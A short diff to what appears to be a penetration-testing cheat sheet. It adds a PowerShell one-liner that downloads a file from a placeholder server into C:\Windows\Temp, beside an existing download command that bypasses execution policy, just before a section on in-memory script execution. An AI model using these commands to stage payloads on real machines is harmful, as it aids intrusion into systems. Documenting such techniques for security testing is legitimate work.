@@ -623,6 +623,7 @@ OR
 
 ```text
 powershell.exe -exec bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://server/filename', 'C:\Windows\Temp\filename')
+powershell -c "Invoke-WebRequest -Uri 'http://server/filename' -OutFile 'C:\Windows\Temp\filename'"
 ```
 
 **PowerShell One-Line Script Execution in Memory**
